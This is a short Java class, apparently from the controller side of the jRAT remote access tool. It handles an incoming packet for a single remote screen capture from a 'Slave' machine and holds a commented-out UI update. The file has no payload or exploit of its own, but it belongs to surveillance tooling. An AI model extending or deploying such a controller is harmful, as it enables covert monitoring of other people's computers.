package pro.jrat.client.packets.incoming;

import java.io.DataInputStream;

import pro.jrat.client.Slave;

public class Packet18OneRemoteScreen extends Packet17RemoteScreen {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		super.read(slave, dis);
		
		/*FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);
		if (frame != null) {
			frame.btnRequestOne.setEnabled(true);
		}*/
	}

}
